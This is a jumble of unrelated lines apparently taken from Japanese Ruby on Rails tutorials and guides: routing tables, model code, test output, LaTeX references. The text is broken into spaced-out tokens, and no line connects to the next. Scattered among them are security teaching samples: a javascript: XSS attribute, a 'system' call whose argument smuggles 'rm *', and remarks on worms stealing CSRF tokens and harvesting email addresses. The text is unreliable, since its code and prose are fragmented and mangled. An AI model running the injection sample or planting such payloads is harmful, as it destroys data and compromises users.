レイアウト の リンク に 対 する テスト   (  \ passing   )
#### ` cattr_reader` 、 ` cattr_writer ` 、 ` cattr_accessor `
\ href { http://peepcode ▖ com/}{Peep Code }:   質 の 高 い 商用 の スクリーン キャスト
作成 し た コード を リスト \ ref{ code :initial _ working _feed } に 示 し ま す
|   GET        | /photos/:id/edit  |  photos#edit        | edit_ image_ path(:id )  |
### `:if ` や `:unless ` で シンボル を 使用 する
リスト \ ref{ code :user_ logout_test } の とき
リスト \ ref{ code : sample_relationships } を 実行 し て データベース 上 の サンプル データ を 作り直 す ため に 、 いつ も の コマンド を 実行 し ま しょ う 。
自動 的 に 以下 の コード に 置き換え られ ま す 。
  = >   2
*  `group `
{ 0 } 図 8 ▖ 1 { / 0 } { 1 } サイン インフォーム の モックアップ ▟ \ href { http://railstutorial ▖org / images/figures/signin_mockup_bootstrap - full ▖ png } { ( 拡大 ) } { / 1 }
\ kode { Gemfile } に Factory   Girl を 追加 する 。
その ため に は \ kode { paginate } メソッド が 必要 で す ▟ この メソッド に つ い て は この 後 説明 し ま す 。
\ kode {before } ブロック を 使用 する こと で この 冗長 箇所 を 除 く こと が でき ま す 。
テスト が 失敗 し た 時 に 、 テスト 失敗 の 道筋 を アプリケーション 全体 に わた っ て たど る スタック トレース   ( バック トレース )   が 表示 さ れ ま す 。
Active   Record   の 基礎
$ bun dle   exec   rake   test   TEST = test/helpers/sessions _helper_test ▖ rb
  #< Client   id :   219 ,  first _ name :  " James " > ,
それ で は 最初 に 、 必要 と な る \ kode {remember\_digest } 属性 を User モデル に 追加 し ま す   ( 図 \ ref { fig :user_ model_remember_digest } ) 。
これ は リスト \ ref{ code : generated_user_fixtures } で 使用 さ れ て い ま し た 。
無効 な 情報 が 送信 さ れ た 場合 、 更新 の 結果 と し て \ kode {false } が 返 さ れ 、 \ kode {else } に 分岐 し て 編集 ページ を レンダリング し ま す 。
どちら の webmail ワーム も メール アドレス を 収集 する こと を 目的 と し て お り 、 犯罪 的 ハッカー が 不正 な 収入 を 得 る の に 使 わ れ る こと が あ り ま す 。
<%=   link_to   " an   article " , @ article ,   remote:  true   %>
する と 、 以下 の よう な エラー が 表示 さ れ ま す 。
スコープ
何 ら か の 理由 で スコープ を すべて 解除 し た い 場合 は ` unscoped ` メソッド を 使用 でき ま す 。
  <strong > Comment: </strong >
次 に 学 ぶ べ き こと
ジョブ を 実行 する
       create    app/controllers/users_controller▖ rb
     alert  " The  article   was   deleted ▖ "
( なお 、 図 \ ref { fig :user_ model_sketch } は 草案 で す ▟ 実際 の データ モデル は 図 \ ref { fig :user_ model_ initial } の よう に な り ま す ) 。
メール アドレス の 小 文字 変換 に 対 する テスト は 演習 と し て 残 し て お き ま す   ( \ ref{ sec : exercises_uniqueness_validation } ) 。
###  form _ for
1234567890123456 ▖ to_s(:human )   # =>  " 1 ▖ 23   Quadrillion "
## #   時間 コンストラクタ
次 に 、 \ kode { followers▖include ? } メソッド を 使 っ て 先ほど の データ モデル を テスト し て い き ま す ▟ テスト コード は リスト \ ref{ code : followers_test } の とおり で す 。
これ ら の メソッド の うち 、 ` association ` の 部分 は プレース ホルダ で あ り 、 ` has _one ` の 最初 の 引数 で あ る 関連 付け 名 を シンボル に し た もの に 置き換え られ ま す 。
  end
It   failed ▖
/ home/ubuntu/workspace/sample_app/
*   クラス メソッド は 「 self ▖ method 」 より も 「 class <<  self 」 が 望まし い 。
 * = require_tree   ▖
<%=  text _field  : person ,  :email_confirmation %>
実質 的 に 世界 中 の あらゆる ソフトウェア は 、 壊れ て い る か 使い にく い か の どちら か だ 。
   config▖ action_view▖sanitized_allowed_tags  =  'table' ,  'tr ' ,  'td'
$  git   checkout   - b my _ new_ branch
名前 付き ルート ` example _ path ` が 衝突 し て い る 例 を 2 つ 示 し ま す 。
変更 の 結果 、 レイアウト ファイル は リスト \ ref{ code :application_layout } の よう に な り ま す 。
# = >   100 %
WARNING :   この オプション を 実際 に 使用 する 意味 は ほぼ な い と 思 わ れ ま す 。
|   レスポンス クラス       |  HTTP ステータス コード   |  シンボル                            |
例 :
###  コントローラ を 生成 する
# Uncomment  these  lines  on   Windows ▖
こう い う とき の ため に 、 「 テスト 駆動 」 に する か 「 一括 テスト 」 に する か を 決め る 目安 と な る ガイドライン が あ る と 便利 で す 。
これ を 行 う ため に 、 リスト \ ref{ code : follow _ form } の \ kode {hidden\_field\_tag } メソッド を 使用 し ま す ▟ この メソッド は   以下 の フォーム の HTML を 生成 し ま す 。
app/assets/stylesheets/custom▖css ▖ scss
ユーザー 表示 ページ を 変更 し た 結果 を リスト \ ref{ code :user_ show _ with _ sidebar } に 示 し ま す 。
同様 に 、 ` before_remove ` で 例外 が 発生 し た 場合 も 、 オブジェクト は コレクション に 削除 さ れ ま せ ん 。
渡 さ れ た 引数 が ` include ? ` に 応答 し な い 場合 は ` ArgumentError ` 例外 が 発生 し ま す 。
#   JSON の ルート 要素 を デフォルト で 無効 に する
Active   Support は 、 ` DateTime ` で 使用 でき る メソッド の 多く を ` Time ` に 追加 し て い ま す 。
\ kode { class  Users Controller <  Application Controller } と い う 記法 で は 、 Ruby の \emph { クラス } \emph { 継承 } の 文法 を その まま 使用 し て い る こと に ご 注目 くださ い
####  ミドルウェア を 交換 する
何 ら か の 新し い セッション キー を 設定 する か 、 すべて の セッション を 削除 する か の どちら か に する 必要 が あ り ま す 。
*   `update_all`
レイアウト 内 で は 、 さまざま な 出力 の 断片 を 組み合わせ て 最終 的 な レスポンス 出力 を 得 る ため の 3 つ の ツール を 利用 でき ま す 。
クラス の 変更 が 複雑 な 場合 は 、 ` ActiveSupport: : Concern ` の 使用 を ご 検討 くださ い 。
       create    app/controllers/microposts_controller▖ rb
リレーションシップ / フォロワー に 対 し て \ kode {belongs\_to } の 関連 付け を 追加 する
これ は リスト \ ref{ code : log _out_with _ forget } で 使用 さ れ て い ま し た 。
上 の ルーティング に よ っ て 、 雑誌   ( magazine )   へ の ルーティング に 加え て 、 広告   ( ad )   を ` Ads Controller ` に ルーティング する こと も でき る よう に な り ま し た 。
   validates_each   : name ,  : surname   do  | record ,   attr ,   value |
標準 的 な RESTful のみ を 使用 し て い る の で あ れ ば 、 これ に 関 する 変更 は 不要 で す 。
アップグレード する に は 、 単に ` gem  ' dalli '` を ` Gemfile ` に 追加 し ま す 。
接続 プール は デフォルト で は Active   Record で 取り扱 わ れ る ため 、 アプリケーション サーバー の 動作 は 、 Thin や mongrel や Unicorn など どれ で あ っ て も 同じ 振る舞い に な り ま す 。
User モデル に \ kode { has_ secure_ password } を 追加 する   (  \failing   )
「 最初 から テスト を 書 か な い と いけ な い で しょ う か ？ 」 も 定番 の 質問 で す 。
データベース 関連 の ファイル
これ は リスト \ ref{ code :microposts_controller_access_control } で 使用 さ れ て い ま し た 。
     var  = bar
|  ** Success **         |   200                | :ok                              |
####  開発 の 動機
     Digest : : SHA 2 ▖ hexdigest ( File ▖ read ( Rails ▖ root ▖ join ( 'test/fixtures ',   path)))
その 引数 は 要素 代入 の 右側 に ひと つ 置 か れ ま す   ( ここ で は サイン イン する ユーザー ) 。
一方 で 、 Java Script が 有効 に な っ て い て も 、 まだ 十分 に 対応 でき て い な い 部分 が あ り ま す 。
<   コミット メッセージ を 編集 し て 、 すべて の 変更 を わか り やす く 記述 する   >
    ORDER   BY  clients▖ created_at  desc " )
期待 し て い る 動作 が まだ 固まり き っ て い な い の で あ れ ば 、 先 に アプリケーション の コード を 書き上げ 、 続 い て 期待 する 動作 を テスト コード で 記述 する こと を 目指 す 。
さらに 、 それぞれ の 行 は ユーザー な の で 、 これ ら の ユーザー に 名前 や パスワード など の 属性 も 追加 する 必要 が あ る で しょ う 。
結果 と し て 、 \ ref{ sec : production_webserver } で アプリケーション の デプロイ が 終わ る と 、 自動 的 に SSL が 有効 化 さ れ て い る はず で す ▟ ,   SSL   will   automatically  be enabled ▖
       create      app/assets/javascripts/static _ pages ▖js▖ coffee
同様 に 、 次 に 書 く 、 テスト に パス する コード の こと を 「 緑色   ( Green ) 」 と 表現 し ま す 。
ミリ 秒 より 精度 の 低 い 従来 方式 に し て お き た い 場合 は 、 イニシャライザ に 以下 を 設定 し て くださ い 。
Java Script に よ る 要素 は [ rails ▖js ] (https://github▖ com/rails/jquery -ujs/blob /master/src/rails ▖js ) で あ り 、 Ruby に よ る 要素 で あ る 正規 の ビュー ヘルパー に よ っ て DOM に 適切 な タグ が 追加 さ れ ま す 。
メール アドレス の 大 文字 小 文字 を 無視 し た 一意 性 の 検証   (  \ passing   )
これ で ` test _jdbcmysql` 、 ` test _jdbcsqlite 3 ` 、 ` test _jdbcpostgresql ` も 呼び出 さ れ ま す 。
_ ポリ モー フィック 関連 付け _ は 、 関連 付け の やや 高度 な 応用 で す 。
以前 は すべて の ヘルパー を いったん 集め て から アルファベット 順 に ソート し て い ま し た 。
Git の インストール 後 、 最初 に 1 回 だけ 行 う 必要 の あ る 設定 が あ り ま す 。
変更 の 結果 を リスト \ ref{ code : create_ password _ reset } に 示 し ま す 。
次 に \ kode {bun dle  install } を 実行 し て インストール し ま す 。
本番 環境 の ユーザー 一覧 ページ
ログ アウト 機能 を テスト する ため に 、 リスト \ ref{ code :user_ login_test _valid _ information } の ユーザー ログ イン の テスト に 手順 を 若干 追加 し ま す 。
     format ▖ json   do
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
#   action _mailer/test _ case ▖ rb
ren der   : edit
リスト \ ref{ code :typography_css } を 反映 し た 結果 を 図 \ ref { fig : sample_app_typography} で 確認 する こと が でき ま す 。
before フィルター   ( \kode {correct _user} )   を 使 っ て 編集 と 更新 を 保護 する  
$ bun dle   exec   rake   test ╼ 3   tests ,   6   assertions ,   3   failures ,   0   errors ,   0   skips
それ に よ り 、 上 の コード が 各 アイテム に 対 し て マッチ する よう に する の が 目的 で す
make_users
いずれ の 場合 も 、 指定 でき る 値 は ` false ` のみ で す ▟'nil ' など 他 の false 値 は 指定 でき ま せ ん 。
" admin _user " ▖ camelize # => " AdminUser "
自動 的 に Spork を 使 う ため の RSpec の 設定 。
╼╼    \ subsection { Heroku の セットアップ }╼    \ label{ sec : heroku_setup}╼╼
これ ら の コントローラ を ` app/controllers/admin ` ディレクトリ に 配置 し 、 ルーティング で これ ら を グループ 化 でき ま す 。
Rails に は テスト 環境   ( \ texttt{ test } ) 、 開発 環境   ( \ texttt { development } ) 、 そして 本番 環境   ( \ texttt { production } )   の 3 つ の 環境 が デフォルト で 装備 さ れ て い ま す 。
この 時 実行 さ れ る SQL は 以下 の よう な 感じ に な り ま す 。
obtaining   a copy  of this   software   and   associated  documentation
/* header * /
この コード は リスト \ ref{ code : layout_ login_logout_links } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
リソース を いく つ も 定義 し な けれ ば な ら な い 場合 は 、 以下 の よう な 略記法 で 一 度 に 定義 する こと で タイプ 量 を 節約 でき ま す 。
" equipment " ▖ pluralize # => " equipment "
  <%=   pagination_links %>
` deep _munge ` が 実行 さ れ な かっ た 場合 に 攻撃 者 に 利用 さ れ る 可能 性 の あ る 脆弱 な コード の 例 を 以下 に 示 し ま す 。
   class   Base
$  cd   rails
###  フォーク
\ href { http://devcenter ▖ heroku▖ com/heroku- command } { Heroku の コマンド } は たくさん あ る の で 、 ここ で は 簡単 に 触れ る 程度 に とどめ ま す が 、 少し だけ 使 っ て み ま しょ う 。
コンテンツ を 名前 付き の ` yield ` と し て レンダリング する に は 、 ` content_ for ` メソッド を 使用 し ま す 。
特に 、 個別 に 指定 し た ファイル は 、 その とおり の 順序 で コンパイル さ れ ま す 。
####  メール アドレス を 名前 で 表示 する
`: separator ` を 指定 する こと で 、 自然 な 区切り 位置 で 切り詰め る こと が でき ま す 。
デフォルト の \ kode { Guardfile } に 追記 する 。
self を 省略 し た 結果 を リスト \ ref{ code :user_unfollow_ test } に 示 し ま す 。
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/string / conversions ▖rb ` で す 。
これ は リスト \ ref{ code :branch_raise } で 使用 さ れ て い ま し た 。
config▖ mid dleware ▖ delete   " Rack : : MethodOverride "
この コード は リスト \ ref{ code :micropost _ partial_with_ delete } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
Active   Record に は さまざま な 機能 が 搭載 さ れ て お り 、 その 中 で も 以下 の もの が 特に 重要 で す 。
上 の コード は 、 引数 で 与え られ た 文字 列 を MIME タイプ ` text / javascript ` で ブラウザ に 送信 し ま す 。
マイグレーション 自体 は 、 データベース に 与え る 変更 を 定義 し た \ kode { change } メソッド の 集まり で す 。
WARNING :   コレクション が 空 の 場合 、 ルート 要素 は デフォルト で " nil クラス " に な り ま す 。
ren der  " / path/to/rails/app/views/books/edit▖html ▖erb "
しかし 新し い バージョン に も [ 若干 の セキュリティ バグ ] ( http://www ▖rorsecurity▖ info / journal/2008 / 10 / 13 / new-redcloth- security▖html ) が あ る ため 、 対応 策 は 未だ に 欠かせ ま せ ん 。
#  config▖ action_dispatch ▖ x_sendfile_header =  " X - Sendfile "  #  Apache 用
###  セキュリティ issue の 特殊 な 取り扱い 方法 に つ い て
#### stylesheet_link_tag
Contact ページ で 使用 する コード
create    app/controllers/blorgh/articles_controller▖ rb
* `before_ action ` コール バック を 使用 し て mail オブジェクト に デフォルト 値 や delivery _ method_options を 与え たり 、 デフォルト の ヘッダ と 添付 を 挿入 する こと も でき ま す 。
       create       test/models/micropost _test ▖ rb
##### `uniq`
rescue   NameError  = > e
以下 を 実行 し て 、 マイグレーション に 図 \ ref { fig :user_ model_ password _ reset } の 属性 を 追加 し ま す 。
で は それ 以外 の 機能 の 実装 に とりかか り ま しょ う 。
この 段階 で は ほとんど 空っぽ の Rails アプリケーション しか あ り ま せ ん が 、 本番 環境 に デプロイ   ( deploy:   デプロイ )   し て しま い ま しょ う 。
これ は リスト \ ref{ code : generate_user_mailer } で 使用 さ れ て い ま し た 。
プログラミング 経験 を 重ね る うち に 、 以下 の よう に 論理 値 に 応じ て 分岐 する 制御 フロー が 実 に よく 出現 する こと が すぐ に わか る と 思 い ま す 。
followers
ハイライト 部分 の 最初 の 行   ( リスト \ ref{ code :find_authenticate_user} )   で は 、 送信 さ れ た メール アドレス を 使用 し て 、 データベース から ユーザー を 取り出 し て い ま す
スコープ ブロック 内 で は 標準 の [ クエリ メソッド ] ( active_ record _querying ▖ html ) を すべて 使用 でき ま す 。
* `: source_type `
テスト を 書 い て 、 この 問題 に 対処 し ま しょ う 。
` therubyrhino ` は JRuby ユーザー 向け に 推奨 さ れ て い る ラン タイム で あ り 、 JRuby 環境 下 で は デフォルト で アプリケーション の ` Gemfile ` に 追加 さ れ ま す 。
Rack 入門
リソース ルーティング で は 、 関連 する さまざま な リクエスト を 1 つ の コントローラ 内 の アクション に 割り当て ま す 。
*   テスト 環境
* * app/views/layouts/application ▖html ▖erb * *
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/object/to_ param ▖rb ` で す 。
現在 の Git ブランチ で 存分 に コード を 書 く こと が でき ま す   ( 念 の ため ` git  branch   - a ` を 実行 し て 、 正し い ブランチ に い る こと を 確認 し て お き ま しょ う ) 。
最初 に Git の コマンド で README の ファイル 形式 を RDoc から Markdown に 変更 し ま す 。
  => true
新し い コメント の 作成 が 完了 し た ら 、 ` article _ path (@ article ) ` ヘルパー を 使用 し て 元 の 記事 の 画面 に 戻 り ま す 。
( なお 、 これ ら の \ kode { count } 、 \kode {empty? } 、 \kode {any ? } メソッド は 、 Ruby の 配列 に 対 し て も その まま 使用 でき ま す 。
NOTE :   メール に 添付 さ れ る ファイル は 自動 的 に Base 64 で エンコード さ れ ま す 。
\ kode { current\ _user } メソッド の 目的 は 、 以下 の よう な コード を 書け る よう に する こと で す 。
上 の よう に 宣言 する と 、 キャッシュ 値 が 最新 の 状態 に 保 た れ 、 次 に ` size ` メソッド が 呼び出 さ れ た とき に その 値 が 返 さ れ ま す 。
####  メディア タイプ に 関 する メモ
この 節 の 残り は 、 この 関数 を 完成 さ せ る こと に 費や さ れ ま す 。
新し い マイクロ ポスト を 作成 し た 直後 の Home ページ
_user_objects   ( end ) ╼╼    \ subsection { ユーザー オブジェクト を 更新 する } %  ( fold) ╼    \ label{ sec : updating _user_objects}╼╼
Rails は 、 ` articles/new ` と い う テンプレート を アプリケーション の ` app/views ` で 探 そ う と し ま す 。
    has_and _belongs_to_many  : assemblies ,  class_ name :  " Gadget "
今後 ` users ` テーブル を アプリケーション で 使用 でき る よう に する ため に 、 ここ で ` rake   db : migrate ` を 実行 する 必要 が あ り ま す 。
/ users / 1   の URL を 有効 に する ため に 、 routes ファイル   ( \kode {config/ routes▖rb } ) に 以下 の 1 行 を 追加 し ま す 。
# => {" " = > nil ,   " 1 " = > 1 ,  " NESTED " = >{" A " = > 3 ,   " 5 " = > 5 } }
この メソッド で は ` : dasherize ` と その 同族 と 同様 の オプション が 使用 でき ま す ▟ それ ら の オプション は ビルダ に 転送 さ れ ま す 。
Git バージョン 管理 を 使用 し て い る 方 は 、 次 に 進 む 前 に 変更 を マージ し て コミット する こと を 忘れ な い で くださ い 。
ユーザー 登録 の 失敗 に 対応 でき る \ kode { create } アクション 。
   if @ article ▖ save
項目   ( オプション や パラメータ の リスト など )   と その 説明 は ハイフン で つな ぐ こと ▟ コロン は シンボル で 使用 さ れ る の で 、 ハイフン の 方 が 読 み やす く な り ま す 。
###  Action   Mailer の 設定 例
development セクション は 以下 の よう に な り ま す 。
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
リスト \ ref{ code : demo_ gemfile_sqlite_ version _redux } の 内容 は リスト \ ref{ code : gemfile_pg _gem } と 同じ で す 。
なぜ 車輪 の 再 発明 を する の か 、 と い う 質問 が あ る の も 当然 で す 。
/ log/*▖ log
Active   Job は 、 ジョブ を 宣言 し 、 それ に よ っ て バック エンド で さまざま な 方法 に よ る キュー 操作 を 実行 する ため の フレームワーク で す 。
*  ` value ` が ` to _xml ` メソッド に 応答 する 場合 、 ` : root ` に キー が 指定 さ れ ま す 。
|     1   |   SIMPLE       |  articles  |   ALL   |  NULL           |
user  =  User ▖find_ by ( name :  ' David ' )
* `: last _word_connector ` :   3 つ 以上 の 要素 を 接続 する 場合 、 最後 の 2 つ の 要素 で 使用 する 接続 詞 を 指定 し ま す 。
ジェネレータ を 実行 する に は 、 ターミナル を 開 き 、 Rails ファイル を 作成 し た い ディレクトリ に 移動 し て 、 以下 を 入力 し ま す 。
###  ページ 変更 イベント
create アクション で 使用 し た ` article _params ` メソッド を ここ で も 使 う こと に し ま す 。
302 ▖ 243 9 89234 23 ▖ to_s(:percentage ,   precision :   5 )
今度 は テスト が 赤色   ( テスト が 失敗 する )   に な る はず で す 。
幸い 、 解決 策 の 実装 は 簡単 で す ▟ 実 は 、 この 問題 は データベース レベル で も 一意 性 を 強制 する だけ で 解決 し ま す 。
特に 今回 の 第 3 版 で は 、 Cloud 9 と 提携 し て 読者 の 皆 様 に チュートリアル 用 に 最適 化 さ れ た 開発 環境 を 提供 でき た こと を 心 から 嬉し く 思 っ て い ま す 。
以下 の 入力 フィールド に 隠 し 属性 が あ る こと に 注目 し て くださ い 。
development モード は 期待 どおり 動作 し ま す 。
Git で バージョン 管理 を し て い る の で あ れ ば 、 これ まで と 同様 、 この 時点 で 新し い ブランチ を 作成 する の が よ い で しょ う 。
       create      app/views/microposts/new▖html ▖erb
場合 に よ っ て は ` belongs_to ` で 使用 さ れ る クエリ を カスタマイズ し た く な る こと が あ り ま す 。
1 つ 前 の 章 の とき と 同じ よう に 、 サンプル データ を 自動 作成 する Rake タスク を 使用 し て 、 データベース に 実際 の データ を 登録 する の が やはり 便利 で す 。
      errors [ : name ]  =   " 以下 の 文字 を 含 む こと は でき ま せ ん   !
セッション の ユーザー ID を 削除 し 、 ブラウザ の 永続 的 cookies を 削除 する と 、 アプリケーション から ユーザー が ログ アウト し ま す 。
`errors▖ full _messages ` メソッド また は ` errors▖ to_a ` メソッド を 使用 し て 、 ユーザー が 実際 に 見 る こと の でき る フォーム 内 の メッセージ を 表示 でき ま す 。
*   Access - Control - Allow - Origin
    resources   : photos
これ を 行 う に は 、 { p 0 } で 行 っ た よう に { 2 } attr_accessor { / 2 } を 使用 し て アクセス 可能 な 属性 を 作成 し ま す 。
` DateTime ` と 同様 、 述語 ` past ? ` と ` future ? ` は ` Time▖ current ` を 起点 と し ま す 。
###  config/ environments/test ▖ rb
  encoding :  unicode
この テスト の 中心 と な る の は 、 フォロー し て い る ユーザー と フォロワー の カウント が ページ に 表示 さ れ 、 それぞれ に 正し い URL が 設定 さ れ て い る こと を 確認 する こと で す 。
プロフィール に   [ Unfollow ]   ボタン が 表示 さ れ 、 フォロワー の カウント が 1 つ 増え た
** `ActiveSupport: : Cache: : Strategy : : Local Cache: : Middleware` * *
もちろん 、 何 の 助け も なし に Web アプリケーション を 作 ら な けれ ば な ら な い など と い う こと は あ り ま せ ん 。
Client▖ count
上 の コマンド で コピー さ れ る マイグレーション は   _ 1 つ _  だけ で あ る 点 に ご 注意 くださ い 。
` create ` など と 同様 、 検証 に パス する か どう か に よ っ て 、 新し い レコード が データベース に 保存 さ れ て い な い こと が あ る か も しれ ま せ ん 。
この コード で は SQL サブ セレクト が 使用 さ れ て い ま す ▟ ユーザー 1 に つ い て すべて を 選択 する こと は 、 内部 的 に は 以下 の よう な 感じ に な り ま す 。
ダイジェスト
   validates :email ,   confirmation :  true
<table  background= " javascript: alert ( ' Hello ') " >
両方 試 し て み る と わか る と 思 い ま す が 、 実際 に 動作 する の は 後者 の 方 で す
NOTE :   設定 し た キュー 名 を キューイング バック エンド が 「 リッ スン する 」 よう に し て くださ い 。
演習 の 解答
GitHub と Bitbucket は 、 現 時点 で の Git リポジトリ の 2 大 人気 サイト で す 。
Rails コントリビュータ
`bun dle  install ` を 実行 し て Spring を インストール する
   # =>  [ " 以下 の 文字 を 含 む こと は でき ま せ ん   !
実 は 、 以下 の よう な 新し い ハッシュ 記法 を 使用 する と 、
` stringify _keys ` メソッド は 、 レシーバ の ハッシュ キー を 文字 列 に 変換 し た ハッシュ を 返 し ま す 。
-   [ Apache ] (https://tn 123 ▖ org / mod _xsendfile/ )
それ で は マイグレーション を 実行 し ま しょ う 。
" It   worked ! "
{ c :   3 ,   b :   2 ,  a :   1 } ▖ to_query  # => " a = 1&b = 2 & c = 3 "
+ ---- +------------- +------- +------- +--------------- +
" John   Smith " ▖ parameterize # => " john - smith "
ビュー で ` field_error _proc ` に アクセス でき ま す 。
残念 ながら 、 この まま で は ユーザー の 作成 を その まま テスト に 含め る と 遅 く な っ て しま い ま す ▟ 幸い な こと に 、 この 問題 は 簡単 に 回避 でき ま す 。
次 に 、 データベース を リセット し て 、 サンプル データ を 再度 生成 し ま す 。
この 行 に 対応 する URL 、 アクション 、 名前 付き ルート は 表 \ ref{table : RESTful_ users } の よう に な り ま す
DOCTYPE  html >
ren der  body :  " raw "
この 動作 は ` config▖ action_dispatch ▖ x_sendfile_header ` で 設定 可能 で す 。
<%=   auto_discovery _ link_tag(:rss ,  { action :  " feed " } ,
この メソッド で は HTML スキャナ と HTML トーク ナイザ   ( tokenizer )   を 使用 し て お り 、 HTML の 解析 能力 は スキャナ の 能力 に 依存 し て い ま す 。
def  self ▖ author_ class
###  Form TagHelper
" Home"
       create      app/assets/stylesheets/microposts▖css ▖ scss
    has_many  : readings
{ 0 } クラス 2 ▖ 16 { / 0 } ╼╼ { 1 } \ kode {Microposts Controller } クラス に おけ る 継承 { 3 } { / 3 }   { 4 } app/controllers/microposts_controller▖ rb { / 4 } { / 1 }
サード パーティ の プラグ イン や gem など
レイアウト を 構成 する
class_attribute   : default _ params
以下 の すべて に お い て 、 ` INNER   JOIN ` を 使用 し た 結合 クエリ が 期待 どおり に 生成 さ れ て い ま す 。
ユーザー 一覧 ページ に 削除 用 リンク が 表示 さ れ る
ルーティング は 、 ネスト さ せ て 使 う こと が でき る
Ruby で は オブジェクト を 継承 でき る
system ( " / bin/echo " , " hello;   rm * " )
上 で 追加 し た コード で は 、 ` link_to ` メソッド の 使 い 方 が これ まで と 違 っ て い る こと に ご 注目 くださ い 。
たとえば 、 エキスパート ユーザー に は 、 通常 ユーザー と 異な る 画面 を 表示 し た い と し ま す 。
Rails に は 、 この 種 の 技法 を Web ページ 作成 で 使用 する ため の サポート が 多数 ビルト イン さ れ て い ま す 。
この 節 で は 、 モックアップ で 示 し た よう に フォロー / フォロー 解除 の 基本 的 な インターフェイス を 実装 し ま す 。
上 の コード は 、 `another ` と い う 名前 の テンプレート を ` app/views/notifications ` ディレクトリ 以下 から 探索 し ま す 。
\ kode { create } アクション で 保存 が 行 わ れ た 後 の 動作 を テスト する 。
= >   [ 17 ,   8 ,   42 ]
Java Script に 精通 し て い る 方 の ため に 補足 する と 、 この 機能 は 組み込 み クラス の プロトタイプ オブジェクト を 使用 し て クラス を 拡張 する こと と 似 て い ま す
モデル や リレーション で の 存在 チェック に は `any ? ` や `many ? ` も 使用 でき ま す 。
  SCSS を 使用 し て サイド バー など の ユーザー 表示 ページ に スタイル を 与え る
` News ` レイアウト を サブ テンプレート 化 する つもり が な い の で あ れ ば 、 ` content_ for ?(:news_content )  ? yield(:news_content )  : yield ` を 単に ` yield ` に 置き換え れ ば 済 み ま す 。
_ 悪意 の あ る 入力 を フィルタ する こと が きわめて 重要 で す ▟ Web アプリケーション の 出力 を エスケープ する こと も 同様 に 重要 で す _ 。
% w ( ▖js ▖css ) ▖ include ? (
さまざま な 用途 に 合わせ て デフォルト 設定 を 変更 でき ま す ▟ たとえば 以下 の よう に デフォルト の タグ に table タグ を 追加 する と し ま す 。
これ で 、 ユーザー が   ( `/articles ` で は な く )   エンジン の ルート パス に 移動 する と 記事 の 一覧 が 表示 さ れ る よう に な り ま し た 。
number_ with _precision ( 111 ▖ 2345 ,   2 )    # = >   11 1 ▖ 2 3
#   指定 さ れ た 日付   ( ここ で は 本日 から 6 日 後 )   を デフォルト 値 と する 日付 セレクト ボックス を 生成 する
\ kode{gravatar _ for } メソッド が 未 定義 の ため 、 ユーザー 表示 ビュー は 現在 動作 し て い ま せ ん 。
この ヘルパー の デフォルト の エラー メッセージ は  _ " is   not   included in  the  list " _  で す 。
この 項 で は 、 プロフィール 画面 で 表示 さ れ る マイクロ ポスト に 対 し て 、 統合 テスト を 書 い て い き ま す 。
*  `association ( force_ reload   =  false ) `
------------------------------
    Header unset   ETag
###  ネスト し た レイアウト を 使用 する
|                     |  416                | : requested_range_not _satisfiable   |
class   B  <  A ; end
置き換え る 文字 列 は 以下 を 使用 し ま す 。
` inclusion ` ヘルパー に は ` : in ` オプション が あ り 、 受け付け 可能 と する 値 の 集合 を 指定 し ま す 。
Rails 開発 を や っ て い れ ば 、 一 度 は   " Can  only ren der or   redirect   once   per  action "   エラー に 遭遇 し た こと が あ る で しょ う 。
###  双 方向 関連 付け
*   すべて の 拡張 機能 を 読み込 む 方法
ホーム ページ の フィード 表示 を テスト する 。
この ドメイン 特化 言語 の 文法 は シンプル で 、 必要 な オブジェクト の 属性 を 定義 する ため に Ruby の ブロック と カスタム メソッド を 使用 し て い ま す 。
class  MysqlAdapter  <  AbstractAdapter
RSpec の \ texttt { let } メソッド を 使用 する と 、 テスト 内 で 簡単 に ローカル 変数 を 作成 する こと が でき ま す 。
ボタン に ユーザー 登録 ページ へ の リンク を 追加 する
   self ▖ locking_ column   = : lock_client_ column
さらに 、 どちら の 例 も \ kode { page } 変数 を 参照 し て い ま す 。
この 種 の コード で は 、 \ kode { signed_ in ? }   論理 値 が 必要 に な り ま す の で 、 これ から 定義 し ま しょ う 。
ワーム 作者 は 、 ユーザー が 追加 さ れ る 直前 に ページ に 送信 さ れ た GET リクエスト の 結果 を 解析 し て CSRF トークン を 得 て い ま し た 。
ディレクティブ は 記載 し た 順 に 実行 さ れ ま す が 、 ` require_tree ` で イン ク ルード さ れ る ファイル の 読み込 み 順序 は 指定 でき ま せ ん 。
|   PATCH / PUT  | /photos/:id       | images #update     |  photo _ path(:id )       |
`@import "* "` や `@import " **/*" ` など の よう に ワイルド カード マッチ で ツリー 全体 を 指定 する こと も でき ま す ▟ これ は ` require_tree ` と 同等 で す 。
     format ▖ atom
### `truncate`
def  show
` belongs_to ` 関連 付け で は 以下 の オプション が サポート さ れ て い ま す 。
ここ で は \ kode { README ▖ rdoc} ファイル の 名前 を \ kode { README ▖ md } に 変更 し 、 チュートリアル 中 に コンテンツ を 追加 でき る よう に し て お き ま しょ う 。
   def  destroy
1 ▖ megabyte # = >   104 8 5 7 6
config▖ mid dleware ▖ insert_after   ActiveRecord : : QueryCache ,  Lifo : : Cache ,   page_cache:  false
date▖ advance ( months :   2 ,   days:   - 2 )  # =>  Wed ,   0 4   Aug  2010
最後 に 、 { 0 } { 1 } 第 10 章 { / 1 } { / 0 } で メール アドレス を 使 っ て アカウント を 有効 化 する 方法 と 、 パスワード を リセット する 方法 に つ い て 学 び ま す 。
    * `: location` - sendmail 実行 ファイル の 場所 。
現在 の 設計 で は 、 攻撃 者 が 仮 に 両方 の cookies を 奪い取 る こと に 成功 し た と し て も 、 本物 の ユーザー が ログ アウト する と ログ イン でき な い よう に な っ て い ま す 。
\ ref{ sec : signup_error _messages } で は 、 この 要求 を 新し い ユーザー を 作 る ため の ユーザー 登録 フォーム に まで 徹底 さ せ る 方法 を 確認 し ま す 。
Yoel  Adler の 指摘 に よ っ て 、 この 問題 と 解決 策 が 見つか り ま し た ▟ 感謝 いた し ま す 。
この オプション は デフォルト で は 無効 で す ▟ サーバー が この ヘッダー を サポート し て い れ ば オン に でき ま す 。
